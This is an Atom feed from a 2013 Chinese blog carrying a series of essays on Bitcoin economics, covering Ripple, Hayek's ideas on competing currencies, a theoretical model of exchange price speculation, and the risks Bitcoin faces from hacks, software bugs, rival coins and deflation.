<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>HackFisher</title>
 <link href="http://hackfisher.github.com/atom.xml" rel="self"/>
 <link href="http://hackfisher.github.com"/>
 <updated>2013-06-05T16:00:26+08:00</updated>
 <id>http://hackfisher.github.com</id>
 <author>
   <name>HackFisher</name>
   <email>hackfisher@gmail.com</email>
 </author>

 
 <entry>
   <title>Bitcoin经济研究系列文章五, Ripple的野心</title>
   <link href="http://hackfisher.github.com/blog/2013/06/bitcoin-economic-research-5"/>
   <updated>2013-06-02T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/06/bitcoin-economic-research-5</id>
   <content type="html">&lt;p&gt;我们在上一篇文章“货币的非国家化”中提到过，最终那些最好的货币不一定是靠天才设计出来的，但一定是通过竞争生存下来的，这也是哈耶克的观点，他认为优秀货币理应如此胜出。比特币虽然在某些特性上明显要比传统法币出色，但是由于局限于中心化的交易所，不断受到威胁，苦于无法与传统法币自由竞争。于是似乎受到某种感召，&lt;a href=&quot;https://ripple.com/&quot;&gt;Ripple&lt;/a&gt;出现了，带着蓬勃的野心，伺机颠覆传统的金融系统并创造金融货币的自由市场。Ripple的目标，不仅仅是货币。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/Currency-Symbol_Regions_of_the_World_circa_2006_cropped.png&quot; alt=&quot;Currency Symbols&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;什么是Ripple?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ripple,是比bitcoin更激进的货币实践。Ripple是以一个数字货币（XRP）和一个开放式的货币转移支付网络共同命名的。它是一个分布式的、开源的支付系统，目前仍在内测中。根据其网站的描述，ripple系统的目标是使人们摆脱的“围墙花园”似的传统金融网络。也就是说，货币在信用卡，银行，PayPal和其他机构间兑换，仅需要很短时间并且极少的手续费。&lt;/p&gt;

&lt;p&gt;Ripple之所以成为比特币之后的一个关注点，是因为包括安德森·霍洛维茨在内的几家著名风投机构于4月10日宣布参与投资OpenCoin，Ripple则是OpenCoin公司开发、运行、维护的虚拟货币网络。&lt;/p&gt;

&lt;p&gt;或许在外人眼里，Ripple是个后来者，但实际上Ripple项目的起源远远早于比特币。2004年，Ryan Fugger就推出了Ripple的第一个实现版本。它的目标是构建一个去中心化的、准许任何人创建自家货币的虚拟货币系统。 公司的两个创始人：Chris Larsen和Jed McCaleb均非等闲之辈。前者在网络金融领域已经摸爬滚打十多年，是著名互联网银行E-Loan和p2p信贷公司Prosper的创始人。后者则是最大的比特币交易平台Mt.Gox的开发者（同时也是著名P2P网络eDonkey——电驴的开发者）。&lt;/p&gt;

&lt;p&gt;业内强力人士的加入，为Ripple项目带来了巨大变化。新版Ripple引入两个措施解决孤立小圈子的问题：其一是推出Ripple币——XRP，它作为Ripple网络的基础货币，就像比特币一样可以整个网络中流通，而不必局限于熟人圈子；其二是引入网关（Gateway）系统，它类似于货币兑换机构，允许人们把法定货币注入、抽离Ripple网络，并可充当借、贷双方的桥梁。&lt;/p&gt;

&lt;p&gt;从最基本的来说，&lt;strong&gt;Ripple提供了一种任何人从任何地方转账任何货币给任何人的一种方式&lt;/strong&gt;。但是，我们还是会问Ripple究竟是什么，它是&lt;a href=&quot;https://ripple.com/how-ripple-works/&quot;&gt;如何&lt;/a&gt;做到这一点的？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/Ripple_how.png&quot; alt=&quot;How Ripple Works&quot; /&gt;&lt;/p&gt;

&lt;p&gt;更具体一点来说，设计上Ripple学习借鉴了比特币的精华，从内部上看，&lt;strong&gt;它是一个分布式P2P的系统&lt;/strong&gt;，所有的节点上的数据库共同维护着总账，而总账则记录了所有的转账，账户以及收支等信息。货币流通的所需要花费的时间就是更新这个总账所需要的时间。这样一个分布式系统建立在一种共识之上，共识的过程保证所有的节点来确认和接受转账并接受同一个总账，同时这个过程保证了进入了总账的转账记录合法性。当然，这样设计的系统和比特币一样，同样面临着51%攻击的风险。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/ledger.png&quot; alt=&quot;Ripple Ledger&quot; /&gt;
&lt;img src=&quot;/uploads/2013/06/consensus.png&quot; alt=&quot;Ripple Consensus&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从外界来看，&lt;strong&gt;Ripple是一个有着清晰边界的统一系统，这个边界就是Gateway&lt;/strong&gt;，Gateway负责Ripple所有货币的流入和流出，是Ripple内部和外部经济的桥梁。接入Gateway的可以简单的像一个货币银行，就像传统的银行那样，Ripple内部记录的就是你在这个Gateway上有多少钱。与传统意义上不同的是，任何人都可以实现一个Gateway，但是为了实现这一点，Ripple引入了Trust(信任度)的概念，以提醒或防止Gateway欺骗泛滥。传统意义上，我将100元存入银行，这100元即为银行对我的负债，我之所以敢将钱存放在银行那边，是因为我相信(Trust)无论如何，即使银行倒闭也能清偿这100元给我。很大程度上，信任度可能更信用有关，也有可能是因为银行被政府信用担保。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/Gateway.png&quot; alt=&quot;Ripple Gateway&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ripple是一个分布式的交易系统框架&lt;/strong&gt;，各种各样的交易系统通过Gateway连接到Ripple，进而连接到其他的交易系统。中心化的交易所一直以来是比特币最头疼的问题，中心化意味着巨大风险和单点故障。社区曾经多次讨论过有无可能建立这样一个分布式的交易系统，但是因为牵涉到法币，很难由用户节点构建。没想到，现在Ripple在理念上更进一步，并非重新构建，而是连接现有的交易所，提供除了交易以为其他的服务(包括法币)，随着像&lt;a href=&quot;https://github.com/buttercoin/buttercoin&quot;&gt;ButterCoin&lt;/a&gt;这样的项目展开，个人构建交易所节点将会变成一件非常容易的事情。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/exchange.png&quot; alt=&quot;Ripple as P2P exchange&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;在Ripple看来，货币即数字&lt;/strong&gt;。所以任何货币，不仅仅包括像比特币这样的虚拟货币，也包括传统的法币，只要这个法币可以抽象成数字。Ripple包容性不可谓不强，货币自由竞争的技术条件由此具备。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;除此之外，Ripple也发行一种叫做XRP的虚拟货币&lt;/strong&gt;。当我们说Ripple的时候，并不是相对于Bitcoin来说的，而是相对于像Paypal和传统金融系统来说，而当我们说XRP的时候，相对的就是BTC。毫无疑问，Ripple提供了一种新的货币XRP来与BTC竞争。Ripple系统创建了固定数量的XRP，总数1000亿。Ripple似乎不喜欢比特币那样的矿工系统，XRP本来是被设计用于支付转账费用(Fee)，处于安全的考虑，每一次转账都需要一小笔转账费用，但是和Bitcoin将这笔费用支付给矿工不同， Ripple选择直接丢弃销毁这些XRP，效果等同于将这些XRP按持有比例分配给XRP所有者。&lt;/p&gt;

&lt;p&gt;当然，每一种货币可能都有它的用途，XRP也可以作为像BTC一样的货币，今天1BTC大约可以兑换6500XRP。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/06/XRP.png&quot; alt=&quot;XRP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;关于Ripple最有争议的应该是它背后的组织，&lt;a href=&quot;http://opencoin.org/&quot;&gt;OpenCoin&lt;/a&gt;。这是一个盈利性的公司，有外部投资，至今没有公开Ripple的关键源代码，虽然它声称一定会公开。它保留25%的XRP用作公司的运营和盈利，关于XRP初期的分配看上去十分随意和人为操控(货币发行量有限的美联储？)。虽然设计上是开放的，但是到目前的现实仍然是中心化的，意味着巨大的风险，很多人怀疑这是一个骗局，不是没有道理。但另一方面，Ripple并不是毫无价值，至少能解决一些问题，虽然组织和系统运作的方式存在争议，但是到目前为止还能工作。与中本聪包揽Bitcoin设计，然后放弃控制一样，Ripple创始人也许不但希望包揽设计，也想包揽系统实现以确保成功，虽然他们似乎理解开放与长远回报紧密相关，但最终在眼前利益面前，他们是否舍得放弃对Ripple的控制？这一点确实值得让人担心一下。&lt;/p&gt;

&lt;p&gt;Ripple带给我们如此之多的新设想，应接不暇。即使只有分布式交易系统一点，就足以吸引人眼球，但是这顶多算是其中一小部分。Ripple的野心在于它希望开拓一个全新的领域，颠覆传统，以至于目前还无法完全想象其未来到底有多震撼!&lt;/p&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.douban.com/group/topic/39564244/&quot;&gt;关于Ripple你需要知道的10件事&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;hr /&gt;

&lt;p&gt;如果你觉得这篇文章对你有用，可以捐赠一点 BTC 给我玩玩。帐号是 &lt;strong&gt;12UhL99zFAF154ip4v9c52YAL8wWUcNXSv&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;或者，如果你使用Ripple，也可以用Ripple捐赠一点 XRP或BTC 给我。账号是 &lt;strong&gt;rhzqDrmFCESkvJHTBz4ecQHKWn2oVQewXz&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Bitcoin经济研究系列文章四, 货币的非国家化-货币价值稳定重要性</title>
   <link href="http://hackfisher.github.com/blog/2013/04/bitcoin-economic-research-4"/>
   <updated>2013-04-20T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/04/bitcoin-economic-research-4</id>
   <content type="html">&lt;p&gt;这个月的比特币行情就像是过山车，先是像发射火箭似的垂直上升到历史高位$266，然后因为交易所被攻击以及市场恐慌，下挫到$50，直到最近的回升，不可谓不惊心动魄。但是比特币的这种价格的剧烈波动，并不利于用于市场交易，对比特币的发展来说并非是件好事。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/04/k_chart_04_30.png&quot; alt=&quot;四月中旬30日K线图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在比特币的拥趸眼中，比特币是乌托邦式的自由经济主义的大胆实践，比特币也许即使最后不能成为成功的货币，但是也很有可能成为打破目前体系枷锁的第一关键之锤。即使比特币只做到了这一点，就可以说是巨大成功了。 而在这些拥迈之中，以奥派经济学的粉丝为众。&lt;/p&gt;

&lt;p&gt;何为奥派经济学? 奥地利经济学派，是近代资产阶级经济学边际效用学派中最主要的一个学派。它崇尚自由市场，支持不受干预的市场经济的强硬主张；除此之外，还倡导政治和社会学说中的自由思想。这里不得不提到的一本书，那就是&lt;a href=&quot;http://book.douban.com/subject/2155342/&quot;&gt;&amp;lt;货币的非国家化&gt;&lt;/a&gt;，作者哈耶克是1974年诺贝尔经济学奖获得者，这本书也是哈耶克万年最后一本经济学专著。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/04/denationalisation_money.jpg&quot; alt=&quot;货币的非国家化&quot; /&gt;&lt;/p&gt;

&lt;p&gt;哈耶克在书中颠覆了正统的货币制度观念：既然在一般商品、服务市场上自由竞争最有效率，那为什么不能在货币领域引入自由竞争？哈耶克提出了一个革命性建议：废除中央银行制度，允许私人发行货币，并自由竞争，这个竞争过程将会发现最好的货币。从比特币的设计考虑来看，初衷似乎跟这本书的思想十分契合，让人不经猜疑是否中本聪也是受了这本书启发。&lt;/p&gt;

&lt;p&gt;但是&amp;lt;货币的非国家化&gt;这本书所支持的观点并非是让比特币成为什么“货币之王”，其核心观点认为应该通过市场自由竞争筛选出最满足人民群众需求的一些货币，注意是“一些”货币，这些需求中其中一个很重要的需求就是货币价值的稳定。由此我们来看，比特币固然是个伟大的设计，但是更为重要的是比特币将国家法币拖入了一场不得不参与的，难以垄断的货币竞争。自由竞争才是哈耶克的观点，最终那些最好的那些货币不一定是靠天才设计出来的，但是一定是通过竞争生存下来的。&lt;/p&gt;

&lt;p&gt;前面已经说了，比特币想要最终在这场货币竞争中成功生存下来，最终一定要达到货币价值的稳定。那么什么是货币价值的稳定呢？&lt;/p&gt;

&lt;p&gt;首先，是货币价值而不是货币价格。 如果要解释价值和价格的区别，追究到经济学上面的定义比较麻烦。但是直观一点理解，价格可以理解为一种相对价值比例，二价值就是实实在在能够满足人们需求的那些东西。如果非要价值量化的化，可以参考一下张五常在&lt;a href=&quot;http://book.douban.com/subject/4178315/&quot;&gt;&amp;lt;货币战略论&gt;&lt;/a&gt;中啰啰嗦嗦反复提到的&quot;一篮子物价指数&quot;，这个其实在&amp;lt;货币的非国家化&gt;第十三章&quot;货币的哪种价值&quot;中也有提到。简单来说，在一段时期之内，要保证单位货币能买到满足人们需求的东西数量相对稳定，而多种货币之间的兑换价格变化并非关键，即使一种货币与其他货币相对价格不变，也不能就说明其满足了需求。就当前比特币的形势来说，因为全球贸易主要是以美元结算，所以美元在总体上能表达商品价值整体上的稳定，比特币的市值和经济实在还是九牛一毛不值一提，所以当前比特币兑美元价格的剧烈变动，却实反应了比特币价值的剧烈变动，无益于被人们接纳用于交易。但Bitcoin还年轻，需要时间来证明。&lt;/p&gt;

&lt;p&gt;其次，如果比特币兑法币价格一直上涨是否一定反应其价值不稳定。如果比特币兑美元价格只是稳定上涨的话，很难说其价值不稳定，因为价格只是反应了一种比例。完全有的另一种可能是，比特币的价值相对稳定，反而法币由于其无节制的货币增发导致法币价值持续下跌。所以，比特币兑美元价格上升，并不能就简单的得出结论说比特币不如法币。不考虑市场，比特币和美元应是平等看待，旧的本位习惯导致的懒惰则容易做出武断判断。&lt;/p&gt;

&lt;p&gt;最后引用亚当.斯密的一句话作为这篇文章的结束，也是&amp;lt;货币的非国家化&gt;这本书序言中的开头:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;我相信，世界各国的君主，都是贪婪不公的。他们欺骗臣民，把货币最初所含金属的真实分量，次第削减。&lt;/p&gt;&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;如果你觉得这篇文章对你有用，可以捐赠一点 BTC 给我玩玩。帐号是 &lt;strong&gt;12UhL99zFAF154ip4v9c52YAL8wWUcNXSv&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Bitcoin经济研究系列文章三，交易零手续费下面的炒作模型</title>
   <link href="http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-3"/>
   <updated>2013-03-30T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-3</id>
   <content type="html">&lt;p&gt;近日BTC的市场价格已经突破$90，达到历史新高点。投资者普遍认为市场很可能存在庄家进行炒作，尤其是经历了3月23日，也就是上个星期六下午市场无缘由的大幅波动之后，很多人都认为这是庄家的一次炒作，先是大幅下挫，抄底后又大幅上扬。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/k_chart_10.png&quot; alt=&quot;近10日K线图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;比特币本身的价值在于利用网络的高效率降低交易成本，越来越多的人和商业活动参与其中，就代表着比特币的效率越高，从而其价值价格越高。然而，还有另外一件事情也会促使比特币的价格高涨，并且不是一件好事，就是炒作。怪不得经常有人说比特币看上去不靠谱，有点像传销，炒作虚无价值的东西，与比特币不同的是，传销除了炒作之外，一无是处，毫无价值。比特币有价值的部分主要集中在用比特币进行财富交易转移，购买物品，兑换法定货币等交易(Transanction)，而这些交易中的有些部分，比如兑换法定货币，在MtGox等处进行投资(Trade)，则是炒作的集中发生地。&lt;/p&gt;

&lt;p&gt;对这种情况，有些喜欢钻研的家伙就做了一些统计和研究，以尝试寻找一些指标来&lt;a href=&quot;http://codinginmysleep.com/measuring-bitcoin-speculation/&quot;&gt;测量比特币的炒作程度&lt;/a&gt;，能比较好的统计比特币的指标，源于比特币的所有交易账本都是公开的，这是一个很不错的副产品，也许是中本聪当时设计所没有考虑到的。&lt;/p&gt;

&lt;p&gt;下面这个图表，就是这个指标，试图描述这个指标，即总体交易和投资炒作的比。因为很多交易所内交易，并不一定产生交易，所以这幅图远达不到精确，只能作为定性分析的一个参考:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/trade_transaction_radio.png&quot; alt=&quot;Trade和Transaction的比&quot; /&gt;&lt;/p&gt;

&lt;p&gt;炒作有很多手法，而且不拘一格，比如最近两三天，主要的一些交易所报告称遭到DDOS攻击，国内的btcchina.com则直接挂了(估计是连夜部署CloudFlare后恢复)。多家交易所在同一时间&lt;a href=&quot;http://www.reddit.com/r/Bitcoin/comments/1b8onj/&quot;&gt;遭到DDOS攻击&lt;/a&gt;，我猜测这次攻击的目的应该不是为了盗窃BTC和资金，而很有可能是和炒家合谋的一次行动，通过攻击造成恐慌拉低价格，从而进行抄底，不过最终似乎这次DDOS攻击的效果并不理想。更多详细的关于此次攻击，请参考&lt;a href=&quot;http://siliconangle.com/blog/2013/03/29/this-week-in-ddos-cyberbunker-vs-spamhaus-mtgox-bitcoin-exchange-and-dwolla-sendgrid/&quot;&gt;这篇文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;在这篇文章，我试图从理论角度分析一种可能存在的有条件约束的炒作模型，这个炒作模型必须要符合下面的几个条件，恰好这些条件在比特币经济中是可以经常被观察到的。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;存在庄家实力雄厚，储备资金充足，BTC储备也充足。这种庄家应该不少见。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;市场预期整体看好，就像现在的BTC一样。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;交易零手续费。这个条件就不常见了，但是不代表不存在，比如交易零手续费的交易所(国内的比如42BTC)，或者交易商自身(比如MtGox或BTCChina的老板)，虽然这些交易商声称不会参与，但是毕竟没有透明到用户和社区可以监督，Who knows?&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;这个模型可以简单的总结为零手续费下的炒高，通过在横盘时期，用自己的资金买自己的比特币，模拟并控制大盘走势，并且有交易量增长的假象，引导散户入场，只要没有其他大庄护盘或打压，问题就不大。结果分成两部分，手中的资金以较低的价格换成自己手中等量的比特币，而比特币则以较高的价格换成了资金。其中比特币部分被自己购买(对庄家来说相当于左手换右手，因为没有交易手续费，没有任何损失，目的是为了增大市场交易量)，另一部分则在控制价格上涨后卖了。资金量变多，比特币不变但价格升高，可以选择继续持有，或卖掉，完美收场。 价格就这样被炒高，看似容易，但是具备这样条件的庄家并不多。&lt;/p&gt;

&lt;p&gt;以上只是一个简化了的模型，真实情况中的市场要远比这个复杂，下面举个例子以简化说明:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;初始状态: 某交易市场，当前市价500 RMB/BTC, 某庄家资金充足，有10,000BTC, 6000,000RMB, 市场看好，也没有其他庄家打压或干扰&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;开始炒作: 庄家开始动用6000,000RMB买入，目标要炒作BTC到700RMB/BTC, 在炒作的同时，如果没有其他人跟随，就用10000BTC挂卖盘，自己左手RMB倒右手BTC(交易零手续费，没有成本)，注意控制价格，形成700RMB/BTC交易量增大的假象，散户跟随进入，6000，000RMB倒手成部分自己的BTC，另外部分的BTC以高于700RMB/BTC的价格卖掉&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;炒作结束: 最终该庄家手里的格局会变成10,000BTC不变, 7500, 000RMB, 净赚1500,000RMB, 因为市场看好，市价可能被炒到比800更高的价格。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;后续: 10,000BTC可以选择继续持有，或者慢慢给市场消化。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;结论是： 在交易零手续费情况下，庄家如果可以通过这个模型把市场做大, 炒作成本变低，获利容易，风险也很小。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;如果你觉得这篇文章对你有用，可以捐赠一点 BTC 给我玩玩。帐号是 &lt;strong&gt;12UhL99zFAF154ip4v9c52YAL8wWUcNXSv&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Bitcoin经济研究系列文章二，有关风险</title>
   <link href="http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-2"/>
   <updated>2013-03-20T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-2</id>
   <content type="html">&lt;p&gt;Bitcoin无疑是当前最具挑战性的一种货币，与当前的法定货币完全处于不同的系统之中。今天Bitcoin的Mt-gox价格已经涨到了$60左右，伴随着的是Bitcoin的各种风险。已经发生的，或未发生的，外部的威胁，内在设计的缺陷，都有可能对比特币经济造成严重打击。&lt;/p&gt;

&lt;p&gt;本文将列数Bitcoin中的各种风险:&lt;/p&gt;

&lt;h2&gt;交易所和在线钱包的信用和被攻击风险&lt;/h2&gt;

&lt;p&gt;Bitcoin需要流通，尤其在初期支持的应用比较少的情况下，就需要与法定货币按照一定的汇率进行交换。而交易所就是一个交换Bitcoin的地方，在去中心化的系统中增加了一些相对中心化的组织，本身就增大了一些风险。事实上Mt.Gox就做过&lt;a href=&quot;http://www.bitecoin.com/online/2011/06/73.html&quot; title=&quot;Mt.Gox回滚BTC交易&quot;&gt;回滚交易&lt;/a&gt;的事情。&lt;/p&gt;

&lt;p&gt;一方面，这些交易所的信用本省就很值得怀疑，谁都不敢保证哪天出状况的时候他们不会跑路。不过到目前为止，这种信用的风险还没有产生现实的严重影响，比特币的最大交易商在日本注册了公司，从某种程度上降低了人们对信用风险的担忧。另一方面，这些交易所存在被黑客攻击的风险，犹豫交易所是大量BTC和现金存放的地方，再加上BTC本省存在的匿名性和不可追踪性，转移起来非常容易。所以BTC交易所成了黑客们最受欢迎的攻击目标。Satoshi Nakamoto所构建的比特币网络一定程度上确保黑客不会攻击网络本身，但不代表不存在其他攻击对象。&lt;/p&gt;

&lt;p&gt;与交易所非常类似的还有在线BTC钱包，比如&lt;a href=&quot;blockchain.info&quot;&gt;blockchain&lt;/a&gt;。由于BTC网络的发展还属于早期，尤其是客户端的易用性很成问题，同步block就需要花费很长时间，对于网络不好的地方使用也不是特别方便。随着比特币开始渐渐被大众了解，易用性的需求就非常迫切。所以越来越多的在线钱包网站产生，或者叫做BTC银行，将blockchain存放在在线钱包，用户选择信任银行以及它的blockchain，只需要提供密钥就可以使用BTC转账。但是风险依然存在，一方面BTC在线钱包本身有可能被攻击，账户丢失或者钱包丢失就意味着BTC丢失，所以BTC银行的安全性要求非常高，必须要达到现实中工业级的水准，另一方面BTC银行的提供商本省是否值得信任也是个大大的问号，这将是很多人是否选择在线钱包的重要考虑因素。&lt;/p&gt;

&lt;p&gt;这里在阐述另外一种可能性，不排除有一天却大多数BTC用户都使用在线钱包后，在线钱包修改blockchain, 产生51%攻击的可能性。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;2011年MtGox被攻击事件

&lt;blockquote&gt;&lt;p&gt;主要的Bitcoin交流场所Mt.Gox遭受了重大破坏，造成数据库中的关键账户被完全破坏并有资金被盗的情况，为此人们对Bitcoin的信心崩盘，币值迅速下跌到之前的1%，并且人们依然在试图疯狂清理他们手上的资金。下面是2011年当时的市场价格跳水情况。&lt;/p&gt;&lt;/blockquote&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/mt_gox_2011.png&quot; alt=&quot;Mt-Gox2011年被攻击后价格跳水&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Bitcoinica的Mt.Gox账户再次被黑, 损失40k BTC和40K USD, 周同对于联合指控的&lt;a href=&quot;http://cnbtcnews.com/bitcoin-news/economics/%E5%91%A8%E5%90%8C%E5%AF%B9%E4%BA%8E%E8%81%94%E5%90%88%E6%8C%87%E6%8E%A7%E7%9A%84%E8%A7%A3%E9%87%8A.html&quot; title=&quot;Bitcoinica被盗&quot;&gt;解释&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.36kr.com/p/201783.html&quot; title=&quot;BitInstant被盗&quot;&gt;比特币中介Bitinstant遭黑客攻击，价值1.2万美元的比特币被盗&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.btcbbs.com/forum.php?mod=viewthread&amp;amp;tid=227&amp;amp;extra=page%3D1&quot;&gt;2013年2月24日，国内BTC交易网站FxBTC 被盗，用户遭受大量损失&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.btcbbs.com/forum.php?mod=viewthread&amp;amp;tid=242&quot;&gt;国内最大的BTC交易网站btcchina.com被爆用户信息泄露，交易密码被重置。同时BTCChina被FxBTC指责为2月24日攻击者，btcchina杨林科随后发表申明否认&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;Bitcoin网络系统复杂度带来的风险&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://book.douban.com/subject/1102259/&quot;&gt;《人月神话》&lt;/a&gt;里面提到了巴比伦塔的故事，是这样说的：&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;现在整个大地都采用一种语言, 只包括为数不多的单词. 在一次从东方往西方迁徙的过 程中,人们发现了苏美尔地区,并在那里定居下来.接着他们奔走相告说: &quot;来,让我们制 造砖块,并把它们烧好.&quot;于是,他们用砖块代替石头,用沥青代替灰泥(建造房屋) .然后,他们又说:&quot;来,让我们建造一座带有高塔的城市,这个塔将高达云宵,也将让我们声名远扬,同时,有了这个城市,我们就可以聚居在这里,再也不会分散在广阔的大地上了.&quot;于是上帝决定下来看看人们建造的城市和高塔,看了以后,他说: &quot;他们只是一个种族,使用 一种的语言,如果他们一开始就能建造城市和高塔,那以后就没有什么难得倒他们了.来,让我们下去,在他们的语言里制造些混淆,让他们相互之间不能听懂.&quot;这样,上帝把人们分散到世界各地,于是他们不得不停止建造那座城市.(创世纪,11:1-8)&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;也许，比特币网络最大的威胁并不像Satoshi Nakamoto想象的那样来自于外部，最大的威胁也许恰恰来源于它自己的复杂度，还有软件工程管理的挑战。这个并不只是臆测，而是实实在在发生了的:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;3月12号的那次&lt;a href=&quot;http://www.btcbbs.com/forum.php?mod=viewthread&amp;amp;tid=238&quot;&gt;网络事故&lt;/a&gt;，导致blockchain分叉，源于发布不久的比特币客户端v0.8的一个bug，导致比特币的市场价格下挫20%，Mt-gox和Bitchina网站停止交易多时，好在最后由于开发团队的迅速反应，没有造成更大的损失。&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Satoshi Nakamoto的设计可能没有缺陷，但事实证明比特币网络的实现极有可能出现BUG，而这种缺陷的弥补很大程度上依赖于比特币网络的开放和开源社区的合作努力。&lt;/p&gt;

&lt;h2&gt;&lt;a href=&quot;http://bitcoin.stackexchange.com/questions/8363/how-will-other-coins-like-litecoin-influence-market-price-of-btc&quot;&gt;来源于其它类BTC的竞争&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;事实上，在3月12日，BTC爆出blockchain分叉的负面消息后，LTC大涨。BTC本身是一种创新，不可避免的会带来一大堆模仿者，LTC就是其中比较出色的，创新的第一名不一定会坚持的最后，虽然目前LTC等模仿者并没有特别优于BTC的特点。但我认为，他们之间存在很强的竞争，就像市场领导者和追随者的竞争。BTC在前面开路，遇到的陷阱追随者可以有效的避免，避免重蹈覆辙，这是后来者的优势。 但是BTC本省作为领先者，优势也很明显。&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;最后BTC和他们的竞争者，到底谁能胜出，我认为这将取决于他们中谁能够解决货币存在的根本原因，降低交易成本。&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/cost_per_transaction.png&quot; alt=&quot;Cost Per Transaction&quot; /&gt;&lt;/p&gt;

&lt;h2&gt;通货紧缩&lt;/h2&gt;

&lt;p&gt;根据Satoshi Nakamoto的设计，最终BTC的数量将会到达一个有限的总数，大概2100万左右，由挖矿新产生的BTC数量，每隔几年就会数量减半。虽然BTC的数量是不断增加的，但是实际上到达了2031年以后，BTC的数量增长就很小很小了。考虑到实际生产率的提高，最终BTC经济会满足通货紧缩，也就是买到相同的货物需要的BTC越来越少。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/total_btc_amout.png&quot; alt=&quot;BTC数量趋势&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当前主流的经济学观点认为适当的通货膨胀是有利于经济发展的，通货紧缩会让人们更愿意存储货币，而不是消费和投资。张五常在他的&lt;a href=&quot;http://book.douban.com/subject/4178315/&quot;&gt;《货币战略论》&lt;/a&gt;中认为货币必须有锚，一直不停的说明为什么人民币应该一篮子物价挂钩，而不是学习美英的法定货币。诺贝尔经济学奖获得者克鲁格曼写了一篇&lt;a href=&quot;http://krugman.blogs.nytimes.com/2010/08/02/why-is-deflation-bad/&quot;&gt;博文&lt;/a&gt;，说明通货紧缩为什么不好，理由有3点。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.reddit.com/r/Bitcoin/comments/15omyz/long_term_success_of_bitcoins_i_have_my_doubts/&quot;&gt;当人们预期价格下跌时，他们变得​​不太愿意花钱，尤其是不太愿意借钱。&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;价格下跌加重债务人实际负​​担。&lt;/li&gt;
&lt;li&gt;在通货紧缩经济中，工资经常不得不下降，但实际上这在现实中是非常困难的。&lt;/li&gt;
&lt;/ul&gt;


